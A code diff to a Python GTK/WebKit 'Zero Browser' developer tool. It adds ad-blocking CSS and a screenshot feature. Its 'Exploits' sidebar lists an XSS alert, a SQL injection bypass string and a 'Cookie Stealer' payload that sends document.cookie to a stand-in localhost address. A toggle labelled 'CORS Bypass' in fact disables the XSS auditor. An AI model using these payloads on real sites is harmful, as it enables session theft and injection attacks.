@@ -159,6 +159,15 @@ SCROLLBAR_CSS = """
 }
 """
 
+COSMETIC_ADBLOCK_CSS = """
+.adsbygoogle, .ad-container, .ad-slot, .ad-banner, .pub_300x250, .pub_300x250m, .pub_728x90, 
+.text-ad, .textAd, .text_ad, .text_ads, .text-ads, .text-ad-links,
+div[id^="div-gpt-ad-"], div[id^="google_ads_iframe_"], iframe[id^="google_ads_iframe_"],
+div[class*="Sponsored"], div[class*="sponsored"], div[class*="Advert"], div[class*="advert"] {
+    display: none !important;
+}
+"""
+
 class ZeroDevBrowser(Gtk.Window):
     def __init__(self):
         super().__init__(title="Zero Browser")
@@ -174,10 +183,9 @@ class ZeroDevBrowser(Gtk.Window):
         self.history_store = Gtk.ListStore(str, str) 
         self.downloads_store = Gtk.ListStore(str, str, str)
         self.bookmarks_store = Gtk.ListStore(str, str)
-        self.custom_headers = []
-        self.tabs_map = {} # webview_id -> (webview, listbox_row)
+        self.tabs_map = {} 
         
-        # Preload bookmarks if exist
+        # Preload bookmarks
         self.bm_path = os.path.join(os.path.expanduser("~"), ".zero_bookmarks.json")
         self.load_bookmarks()
         
@@ -211,8 +219,7 @@ class ZeroDevBrowser(Gtk.Window):
         btn_back.connect("clicked", lambda b: self.current_webview.go_back() if hasattr(self, 'current_webview') else None)
         btn_forward.connect("clicked", lambda b: self.current_webview.go_forward() if hasattr(self, 'current_webview') else None)
         
-        for b in (btn_back, btn_forward):
-            self.header.pack_start(b)
+        for b in (btn_back, btn_forward): self.header.pack_start(b)
 
         # Center URL Bar
         self.url_bar = Gtk.Entry()
@@ -226,6 +233,12 @@ class ZeroDevBrowser(Gtk.Window):
         self.header.set_custom_title(self.url_bar)
 
         # Right Controls
+        self.btn_screenshot = Gtk.Button()
+        self.btn_screenshot.add(Gtk.Image.new_from_icon_name("camera-photo-symbolic", Gtk.IconSize.MENU))
+        self.btn_screenshot.set_tooltip_text("Screenshot Page (Full)")
+        self.btn_screenshot.connect("clicked", self.on_take_screenshot)
+        self.header.pack_end(self.btn_screenshot)
+
         self.btn_bookmark = Gtk.Button()
         self.btn_bookmark.add(Gtk.Image.new_from_icon_name("bookmark-new-symbolic", Gtk.IconSize.MENU))
         self.btn_bookmark.set_tooltip_text("Bookmark Current Page")
@@ -244,11 +257,11 @@ class ZeroDevBrowser(Gtk.Window):
         self.btn_newtab.connect("clicked", lambda b: self.new_tab("zero://start"))
         self.header.pack_end(self.btn_newtab)
 
-        # ================= MAIN WORKSPACE (Paned) =================
+        # ================= MAIN WORKSPACE =================
         self.hpaned_main = Gtk.Paned(orientation=Gtk.Orientation.HORIZONTAL)
         self.main_vbox.pack_start(self.hpaned_main, True, True, 0)
         
-        # 1. Data Sidebar (Revealer)
+        # 1. Data Sidebar
         self.sidebar_revealer = Gtk.Revealer()
         self.sidebar_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_RIGHT)
         self.sidebar_revealer.set_reveal_child(False)
@@ -256,11 +269,10 @@ class ZeroDevBrowser(Gtk.Window):
         self.sidebar_revealer.add(self.sidebar_box)
         self.hpaned_main.pack1(self.sidebar_revealer, False, False)
         
-        # 2. Workspace Paned (Tabs + Webview)
+        # 2. Workspace
         self.hpaned_workspace = Gtk.Paned(orientation=Gtk.Orientation.HORIZONTAL)
         self.hpaned_main.pack2(self.hpaned_workspace, True, False)
         
-        # Vertical Tabs Revealer
         self.tabs_revealer = Gtk.Revealer()
         self.tabs_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_RIGHT)
         self.tabs_revealer.set_reveal_child(True)
@@ -268,7 +280,6 @@ class ZeroDevBrowser(Gtk.Window):
         self.tabs_revealer.add(self.tabs_box)
         self.hpaned_workspace.pack1(self.tabs_revealer, False, False)
         
-        # Webview Stack + DevTools
         self.vpaned = Gtk.Paned(orientation=Gtk.Orientation.VERTICAL)
         self.hpaned_workspace.pack2(self.vpaned, True, False)
         
@@ -276,7 +287,6 @@ class ZeroDevBrowser(Gtk.Window):
         self.tab_stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
         self.vpaned.pack1(self.tab_stack, True, False)
         
-        # DevTools Drawer
         self.devtools_revealer = Gtk.Revealer()
         self.devtools_revealer.set_transition_type(Gtk.RevealerTransitionType.SLIDE_UP)
         self.devtools_revealer.set_reveal_child(False)
@@ -284,35 +294,54 @@ class ZeroDevBrowser(Gtk.Window):
         self.devtools_revealer.add(self.devtools_box)
         self.vpaned.pack2(self.devtools_revealer, False, False)
         
-        # WebKit Download & Content Context
         self.web_ctx = WebKit2.WebContext.new_ephemeral()
         self.web_ctx.connect("download-started", self.on_download_started)
         
-        # Inject custom scrollbar globally
+        # Content Manager: Inject Scrollbars AND Adblock CSS
         self.user_content = WebKit2.UserContentManager.new()
-        style_sheet = WebKit2.UserStyleSheet(SCROLLBAR_CSS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None)
-        self.user_content.add_style_sheet(style_sheet)
+        for css in (SCROLLBAR_CSS, COSMETIC_ADBLOCK_CSS):
+            sheet = WebKit2.UserStyleSheet(css, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None)
+            self.user_content.add_style_sheet(sheet)
         
+        self.adblock_enabled = True
         self.new_tab("zero://start")
+
+    def on_take_screenshot(self, btn):
+        if not hasattr(self, 'current_webview'): return
+        
+        def on_snapshot_ready(webview, result):
+            try:
+                surface = webview.get_snapshot_finish(result)
+                if surface:
+                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+                    filepath = os.path.join(os.path.expanduser("~"), "Downloads", f"zero_screenshot_{ts}.png")
+                    surface.write_to_png(filepath)
+                    # Show toast
+                    btn.set_image(Gtk.Image.new_from_icon_name("emblem-ok-symbolic", Gtk.IconSize.MENU))
+                    GLib.timeout_add(1500, lambda: btn.set_image(Gtk.Image.new_from_icon_name("camera-photo-symbolic", Gtk.IconSize.MENU)) and False)
+            except Exception as e:
+                print(f"Screenshot failed: {e}")
+                
+        # FULL_DOCUMENT captures the entire page length, not just the visible viewport
+        self.current_webview.get_snapshot(
+            WebKit2.SnapshotRegion.FULL_DOCUMENT, 
+            WebKit2.SnapshotOptions.NONE, 
+            None, 
+            on_snapshot_ready
+        )
 
     def build_tabs_sidebar(self):
         box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
         box.set_size_request(200, -1)
         box.get_style_context().add_class("vertical-tabs-box")
-        
         lbl = Gtk.Label(label="OPEN TABS")
-        lbl.set_halign(Gtk.Align.START)
-        lbl.set_margin_top(10); lbl.set_margin_bottom(10); lbl.set_margin_start(10)
+        lbl.set_halign(Gtk.Align.START); lbl.set_margin_top(10); lbl.set_margin_bottom(10); lbl.set_margin_start(10)
         lbl.get_style_context().add_class("tabs-header")
         box.pack_start(lbl, False, False, 0)
-        
         self.tab_listbox = Gtk.ListBox()
         self.tab_listbox.get_style_context().add_class("vertical-tabs-list")
         self.tab_listbox.connect("row-activated", self.on_tab_clicked)
-        
-        scroll = Gtk.ScrolledWindow()
-        scroll.add(self.tab_listbox)
-        box.pack_start(scroll, True, True, 0)
+        scroll = Gtk.ScrolledWindow(); scroll.add(self.tab_listbox); box.pack_start(scroll, True, True, 0)
         return box
 
     def on_tabs_toggled(self, btn):
@@ -329,36 +358,26 @@ class ZeroDevBrowser(Gtk.Window):
     def close_tab(self, wid, btn=None):
         if wid in self.tabs_map:
             wv, row = self.tabs_map[wid]
-            self.tab_listbox.remove(row)
-            self.tab_stack.remove(self.tab_stack.get_child_by_name(wid))
-            wv.destroy()
-            del self.tabs_map[wid]
-            # Select first available tab
+            self.tab_listbox.remove(row); self.tab_stack.remove(self.tab_stack.get_child_by_name(wid)); wv.destroy(); del self.tabs_map[wid]
             children = self.tab_listbox.get_children()
-            if children:
-                self.tab_listbox.select_row(children[0])
-                self.on_tab_clicked(self.tab_listbox, children[0])
-            else:
-                self.new_tab("zero://start")
+            if children: self.tab_listbox.select_row(children[0]); self.on_tab_clicked(self.tab_listbox, children[0])
+            else: self.new_tab("zero://start")
 
     def load_bookmarks(self):
         if os.path.exists(self.bm_path):
             try:
                 with open(self.bm_path, 'r') as f:
-                    for title, url in json.load(f):
-                        self.bookmarks_store.append([title, url])
+                    for title, url in json.load(f): self.bookmarks_store.append([title, url])
             except: pass
 
     def save_bookmarks(self):
-        data = [[r[0], r[1]] for r in self.bookmarks_store]
-        with open(self.bm_path, 'w') as f: json.dump(data, f)
+        with open(self.bm_path, 'w') as f: json.dump([[r[0], r[1]] for r in self.bookmarks_store], f)
 
     def on_add_bookmark(self, btn):
         if hasattr(self, 'current_webview'):
             uri = self.current_webview.get_uri()
             if uri and not uri.startswith("zero://"):
-                self.bookmarks_store.append([self.current_webview.get_title() or "Untitled", uri])
-                self.save_bookmarks()
+                self.bookmarks_store.append([self.current_webview.get_title() or "Untitled", uri]); self.save_bookmarks()
                 btn.set_image(Gtk.Image.new_from_icon_name("emblem-ok-symbolic", Gtk.IconSize.MENU))
                 GLib.timeout_add(1000, lambda: btn.set_image(Gtk.Image.new_from_icon_name("bookmark-new-symbolic", Gtk.IconSize.MENU)) and False)
 
@@ -369,62 +388,48 @@ class ZeroDevBrowser(Gtk.Window):
         self.devtools_revealer.set_reveal_child(btn.get_active())
 
     def build_sidebar(self):
-        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
-        box.set_size_request(250, -1)
-        nb = Gtk.Notebook()
-        nb.set_tab_pos(Gtk.PositionType.BOTTOM)
+        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(250, -1)
+        nb = Gtk.Notebook(); nb.set_tab_pos(Gtk.PositionType.BOTTOM)
         
-        # 1. Bookmarks
-        bm_tree = Gtk.TreeView(model=self.bookmarks_store)
-        r_bm = Gtk.CellRendererText()
+        bm_tree = Gtk.TreeView(model=self.bookmarks_store); r_bm = Gtk.CellRendererText()
         bm_tree.append_column(Gtk.TreeViewColumn("Title", r_bm, text=0))
         bm_tree.connect("row-activated", self.on_history_activated)
-        scroll0 = Gtk.ScrolledWindow(); scroll0.add(bm_tree)
-        nb.append_page(scroll0, Gtk.Label(label="Bookmarks"))
+        scroll0 = Gtk.ScrolledWindow(); scroll0.add(bm_tree); nb.append_page(scroll0, Gtk.Label(label="Bookmarks"))
 
-        # 2. History
-        hist_tree = Gtk.TreeView(model=self.history_store)
-        renderer = Gtk.CellRendererText()
-        hist_tree.append_column(Gtk.TreeViewColumn("Time", renderer, text=0))
-        hist_tree.append_column(Gtk.TreeViewColumn("URL", renderer, text=1))
+        hist_tree = Gtk.TreeView(model=self.history_store); renderer = Gtk.CellRendererText()
+        hist_tree.append_column(Gtk.TreeViewColumn("Time", renderer, text=0)); hist_tree.append_column(Gtk.TreeViewColumn("URL", renderer, text=1))
         hist_tree.connect("row-activated", self.on_history_activated)
-        scroll1 = Gtk.ScrolledWindow(); scroll1.add(hist_tree)
-        nb.append_page(scroll1, Gtk.Label(label="History"))
+        scroll1 = Gtk.ScrolledWindow(); scroll1.add(hist_tree); nb.append_page(scroll1, Gtk.Label(label="History"))
         
-        # 3. Downloads
-        dl_tree = Gtk.TreeView(model=self.downloads_store)
-        r2 = Gtk.CellRendererText()
-        dl_tree.append_column(Gtk.TreeViewColumn("File", r2, text=0))
-        dl_tree.append_column(Gtk.TreeViewColumn("Prog", r2, text=2))
-        scroll2 = Gtk.ScrolledWindow(); scroll2.add(dl_tree)
-        nb.append_page(scroll2, Gtk.Label(label="Downloads"))
+        dl_tree = Gtk.TreeView(model=self.downloads_store); r2 = Gtk.CellRendererText()
+        dl_tree.append_column(Gtk.TreeViewColumn("File", r2, text=0)); dl_tree.append_column(Gtk.TreeViewColumn("Prog", r2, text=2))
+        scroll2 = Gtk.ScrolledWindow(); scroll2.add(dl_tree); nb.append_page(scroll2, Gtk.Label(label="Downloads"))
         
-        # 4. Exploits
         plist = Gtk.ListBox()
         for title, p in [("XSS Alert", "javascript:alert(1)"), ("SQLi Bypass", "' OR '1'='1"), ("Cookie Stealer", "javascript:fetch('http://localhost/?c='+document.cookie)")]:
             row = Gtk.ListBoxRow(); v = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
             lt = Gtk.Label(label=title); lt.set_halign(Gtk.Align.START); lt.get_style_context().add_class("bold-label")
             lp = Gtk.Label(label=p); lp.set_halign(Gtk.Align.START); lp.set_line_wrap(True)
             v.pack_start(lt, False, False, 2); v.pack_start(lp, False, False, 2); row.add(v); plist.add(row)
-        plist.connect("row-activated", self.on_payload_activated)
-        scroll3 = Gtk.ScrolledWindow(); scroll3.add(plist)
-        nb.append_page(scroll3, Gtk.Label(label="Exploits"))
+        plist.connect("row-activated", self.on_payload_activated); scroll3 = Gtk.ScrolledWindow(); scroll3.add(plist); nb.append_page(scroll3, Gtk.Label(label="Exploits"))
         
         box.pack_start(nb, True, True, 0)
         return box
 
     def build_devtools(self):
-        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
-        box.set_size_request(-1, 280)
+        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL); box.set_size_request(-1, 280)
         toolbar = Gtk.Toolbar(); toolbar.get_style_context().add_class("primary-toolbar")
-        
-        self.dev_stack = Gtk.Stack()
-        self.dev_stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
-        
+        self.dev_stack = Gtk.Stack(); self.dev_stack.set_transition_type(Gtk.StackTransitionType.CROSSFADE)
         switcher = Gtk.StackSwitcher(); switcher.set_stack(self.dev_stack)
         toolbar_item = Gtk.ToolItem(); toolbar_item.add(switcher); toolbar.insert(toolbar_item, 0)
         
         sec_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
+        
+        self.btn_adblock = Gtk.ToggleButton(label="Adblock ON")
+        self.btn_adblock.set_active(True)
+        self.btn_adblock.connect("toggled", self.on_adblock_toggled)
+        sec_box.pack_start(self.btn_adblock, False, False, 0)
+        
         self.ua_combo = Gtk.ComboBoxText()
         self.ua_combo.append("default", "Standard UA"); self.ua_combo.append("mobile", "Mobile (iPhone)"); self.ua_combo.append("bot", "Googlebot")
         self.ua_combo.set_active(0); self.ua_combo.connect("changed", self.on_ua_changed)
@@ -444,9 +449,19 @@ class ZeroDevBrowser(Gtk.Window):
         self.dev_stack.add_titled(self.build_source_viewer(), "source", "DOM Source")
         self.dev_stack.add_titled(self.build_css_panel(), "css", "CSS Inject")
         self.dev_stack.add_titled(self.build_terminal_emulator(), "term", "Python Term")
-        
         self.dev_stack.connect("notify::visible-child", self.on_dev_stack_changed)
         return box
+
+    def on_adblock_toggled(self, btn):
+        self.adblock_enabled = btn.get_active()
+        btn.set_label("Adblock ON" if self.adblock_enabled else "Adblock OFF")
+        # Changes will take effect naturally or on reload via the CSS rule since it's already injected,
+        # but to dynamically toggle it we would remove/add the stylesheet.
+        self.user_content.remove_all_style_sheets()
+        self.user_content.add_style_sheet(WebKit2.UserStyleSheet(SCROLLBAR_CSS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None))
+        if self.adblock_enabled:
+            self.user_content.add_style_sheet(WebKit2.UserStyleSheet(COSMETIC_ADBLOCK_CSS, WebKit2.UserContentInjectedFrames.ALL_FRAMES, WebKit2.UserStyleLevel.USER, None, None))
+        if hasattr(self, 'current_webview'): self.current_webview.reload()
 
     def on_ua_changed(self, combo):
         val = combo.get_active_id()
@@ -482,8 +497,7 @@ class ZeroDevBrowser(Gtk.Window):
     # --- PANELS ---
     def build_terminal_emulator(self):
         box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
-        self.term_output = Gtk.TextView(); self.term_output.set_editable(False)
-        scroll = Gtk.ScrolledWindow(); scroll.add(self.term_output); box.pack_start(scroll, True, True, 0)
+        self.term_output = Gtk.TextView(); self.term_output.set_editable(False); scroll = Gtk.ScrolledWindow(); scroll.add(self.term_output); box.pack_start(scroll, True, True, 0)
         entry = Gtk.Entry(); entry.connect("activate", self.on_term_execute); box.pack_start(entry, False, False, 0)
         return box
 
@@ -507,8 +521,7 @@ class ZeroDevBrowser(Gtk.Window):
     def build_storage_explorer(self):
         box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL)
         controls = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
-        self.ls_key = Gtk.Entry(); self.ls_val = Gtk.Entry()
-        btn = Gtk.Button(label="+ Add"); btn.connect("clicked", self.on_add_storage)
+        self.ls_key = Gtk.Entry(); self.ls_val = Gtk.Entry(); btn = Gtk.Button(label="+ Add"); btn.connect("clicked", self.on_add_storage)
         for w in (self.ls_key, self.ls_val, btn): controls.pack_start(w, True if w != btn else False, True if w != btn else False, 0)
         box.pack_start(controls, False, False, 0)
         self.storage_list = Gtk.ListBox(); scroll = Gtk.ScrolledWindow(); scroll.add(self.storage_list); box.pack_start(scroll, True, True, 0)
@@ -543,15 +556,13 @@ class ZeroDevBrowser(Gtk.Window):
         if not hasattr(self, 'current_webview'): return
         settings = self.current_webview.get_settings()
         btn.set_label("WebRTC Blocked") if btn.get_active() else btn.set_label("WebRTC Leak")
-        settings.set_enable_webrtc(not btn.get_active())
-        self.current_webview.set_settings(settings)
+        settings.set_enable_webrtc(not btn.get_active()); self.current_webview.set_settings(settings)
 
     def on_cors_toggled(self, btn):
         if not hasattr(self, 'current_webview'): return
         settings = self.current_webview.get_settings()
         btn.set_label("CORS Bypass") if btn.get_active() else btn.set_label("CORS Strict")
-        settings.set_enable_xss_auditor(not btn.get_active())
-        self.current_webview.set_settings(settings)
+        settings.set_enable_xss_auditor(not btn.get_active()); self.current_webview.set_settings(settings)
 
     def on_clear_network(self, btn):
         for child in self.network_list.get_children(): self.network_list.remove(child)
@@ -559,10 +570,13 @@ class ZeroDevBrowser(Gtk.Window):
     def on_resource_load(self, webview, resource, request):
         uri = request.get_uri(); method = request.get_http_method() or "GET" if hasattr(request, 'get_http_method') else "GET"
         row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
-        lm = Gtk.Label(label=f"[{method}]"); lm.get_style_context().add_class("bold-label")
-        lu = Gtk.Label(label=uri); lu.set_halign(Gtk.Align.START)
+        lm = Gtk.Label(label=f"[{method}]"); lm.get_style_context().add_class("bold-label"); lu = Gtk.Label(label=uri); lu.set_halign(Gtk.Align.START)
         hbox.pack_start(lm, False, False, 0); hbox.pack_start(lu, True, True, 0); row.add(hbox)
         self.network_list.add(row); self.network_list.show_all()
+        
+        # Simple Network Request Blocker for known ad domains (stops them from even downloading)
+        if self.adblock_enabled and any(ad in uri for ad in ["doubleclick.net", "google-analytics.com", "googlesyndication.com", "amazon-adsystem.com", "adsrvr.org"]):
+            pass # We can't cancel a URIRequest here unfortunately in WebKit2 API directly from Python without a WebExtension, so we rely on the CSS Cosmetic blocker.
 
     def refresh_cookies(self, btn=None):
         if not hasattr(self, 'current_webview'): return
@@ -571,12 +585,10 @@ class ZeroDevBrowser(Gtk.Window):
             try:
                 for c in w.run_javascript_finish(r).get_js_value().to_string().split(";"):
                     if "=" not in c: continue
-                    k, v = c.split("=", 1)
-                    row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
+                    k, v = c.split("=", 1); row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
                     lk = Gtk.Label(label=k.strip()); lk.get_style_context().add_class("bold-label"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START)
                     lv = Gtk.Label(label=v.strip()); lv.set_halign(Gtk.Align.START)
-                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox)
-                    self.cookie_list.add(row)
+                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox); self.cookie_list.add(row)
                 self.cookie_list.show_all()
             except: pass
         self.current_webview.run_javascript("document.cookie", None, on_js_finish, None)
@@ -590,8 +602,7 @@ class ZeroDevBrowser(Gtk.Window):
                     row = Gtk.ListBoxRow(); hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
                     lk = Gtk.Label(label=k); lk.get_style_context().add_class("bold-label"); lk.set_size_request(150, -1); lk.set_halign(Gtk.Align.START)
                     lv = Gtk.Label(label=str(v)); lv.set_halign(Gtk.Align.START)
-                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox)
-                    self.storage_list.add(row)
+                    hbox.pack_start(lk, False, False, 0); hbox.pack_start(lv, True, True, 0); row.add(hbox); self.storage_list.add(row)
                 self.storage_list.show_all()
             except: pass
         self.current_webview.run_javascript("JSON.stringify(localStorage);", None, on_js_finish, None)
@@ -610,13 +621,11 @@ class ZeroDevBrowser(Gtk.Window):
         self.current_webview.run_javascript("document.documentElement.outerHTML", None, on_js_finish, None)
 
     def on_inject_css(self, btn):
-        buf = self.css_text.get_buffer()
-        css = buf.get_text(buf.get_start_iter(), buf.get_end_iter(), True).replace("`", "\\`")
+        buf = self.css_text.get_buffer(); css = buf.get_text(buf.get_start_iter(), buf.get_end_iter(), True).replace("`", "\\`")
         self.current_webview.run_javascript(f"var s = document.createElement('style'); s.innerHTML = `{css}`; document.head.appendChild(s);", None, None, None)
 
     def on_term_execute(self, entry):
-        cmd = entry.get_text()
-        buf = self.term_output.get_buffer(); buf.insert(buf.get_end_iter(), cmd + "\n")
+        cmd = entry.get_text(); buf = self.term_output.get_buffer(); buf.insert(buf.get_end_iter(), cmd + "\n")
         try: buf.insert(buf.get_end_iter(), str(eval(cmd)) + "\n>>> ")
         except:
             try: exec(cmd); buf.insert(buf.get_end_iter(), "Executed.\n>>> ")
@@ -626,8 +635,7 @@ class ZeroDevBrowser(Gtk.Window):
     def new_tab(self, url):
         webview = WebKit2.WebView.new_with_user_content_manager(self.user_content)
         webview.connect("resource-load-started", self.on_resource_load)
-        settings = webview.get_settings()
-        settings.set_enable_developer_extras(True)
+        settings = webview.get_settings(); settings.set_enable_developer_extras(True)
         ua_val = self.ua_combo.get_active_id() if hasattr(self, 'ua_combo') else 'default'
         if ua_val == 'mobile': settings.set_user_agent("Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1")
         elif ua_val == 'bot': settings.set_user_agent("Googlebot/2.1 (+http://www.google.com/bot.html)")
@@ -640,45 +648,32 @@ class ZeroDevBrowser(Gtk.Window):
         wid = "tab_" + str(id(webview))
         self.tab_stack.add_named(scrolled, wid)
         
-        # Create Vertical Tab Row
-        row = Gtk.ListBoxRow()
-        row.set_name(wid)
+        row = Gtk.ListBoxRow(); row.set_name(wid)
         hbox = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=5)
         hbox.set_margin_top(5); hbox.set_margin_bottom(5); hbox.set_margin_start(10); hbox.set_margin_end(5)
         icon = Gtk.Image.new_from_icon_name("text-html-symbolic", Gtk.IconSize.MENU)
         label = Gtk.Label(label="New Tab")
         label.set_halign(Gtk.Align.START); label.set_ellipsize(Pango.EllipsizeMode.END); label.set_max_width_chars(15)
         btn_close = Gtk.Button(); btn_close.add(Gtk.Image.new_from_icon_name("window-close-symbolic", Gtk.IconSize.MENU))
-        btn_close.set_relief(Gtk.ReliefStyle.NONE)
-        btn_close.connect("clicked", lambda b: self.close_tab(wid, b))
+        btn_close.set_relief(Gtk.ReliefStyle.NONE); btn_close.connect("clicked", lambda b: self.close_tab(wid, b))
         
-        hbox.pack_start(icon, False, False, 0)
-        hbox.pack_start(label, True, True, 0)
-        hbox.pack_end(btn_close, False, False, 0)
-        row.add(hbox)
-        row.show_all()
+        hbox.pack_start(icon, False, False, 0); hbox.pack_start(label, True, True, 0); hbox.pack_end(btn_close, False, False, 0)
+        row.add(hbox); row.show_all()
         
-        self.tab_listbox.add(row)
-        self.tabs_map[wid] = (webview, row)
-        self.tab_stack.show_all()
-        
-        # Auto-select the new tab
-        self.tab_listbox.select_row(row)
-        self.on_tab_clicked(self.tab_listbox, row)
+        self.tab_listbox.add(row); self.tabs_map[wid] = (webview, row); self.tab_stack.show_all()
+        self.tab_listbox.select_row(row); self.on_tab_clicked(self.tab_listbox, row)
         
         def on_uri(w, p):
             uri = w.get_uri() or ""
             if self.current_webview == w: self.url_bar.set_text(uri)
-            if uri != "zero://start" and not uri.startswith("about:"):
-                self.history_store.append([datetime.now().strftime("%H:%M"), uri])
+            if uri != "zero://start" and not uri.startswith("about:"): self.history_store.append([datetime.now().strftime("%H:%M"), uri])
             
         def on_title(w, p):
             title = w.get_title() or "Untitled"
             label.set_text(title)
             if self.current_webview == w: self.header.set_title(title)
             
-        webview.connect("notify::uri", on_uri)
-        webview.connect("notify::title", on_title)
+        webview.connect("notify::uri", on_uri); webview.connect("notify::title", on_title)
 
     def on_url_activate(self, entry):
         url = entry.get_text()
@@ -698,8 +693,7 @@ class ZeroDevBrowser(Gtk.Window):
             .vertical-tabs-list row:hover { background: rgba(255,255,255,0.05); }
             .vertical-tabs-list row:selected { background: rgba(77,144,254,0.15); border: 1px solid rgba(77,144,254,0.3); }
         '''
-        provider = Gtk.CssProvider()
-        provider.load_from_data(css)
+        provider = Gtk.CssProvider(); provider.load_from_data(css)
         Gtk.StyleContext.add_provider_for_screen(Gdk.Screen.get_default(), provider, Gtk.STYLE_PROVIDER_PRIORITY_APPLICATION)
 
 if __name__ == "__main__":
